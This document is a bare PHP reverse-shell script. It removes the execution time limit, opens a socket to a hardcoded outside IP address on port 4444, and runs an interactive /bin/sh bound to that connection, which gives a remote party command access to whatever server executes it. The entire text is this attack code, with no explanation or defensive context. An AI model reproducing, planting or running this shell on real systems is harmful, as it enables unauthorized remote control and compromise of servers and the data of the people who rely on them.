<?php
set_time_limit(0);
$IP = '103.91.128.224';
$PORT = 4444;
$sock = fsockopen($IP, $PORT);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
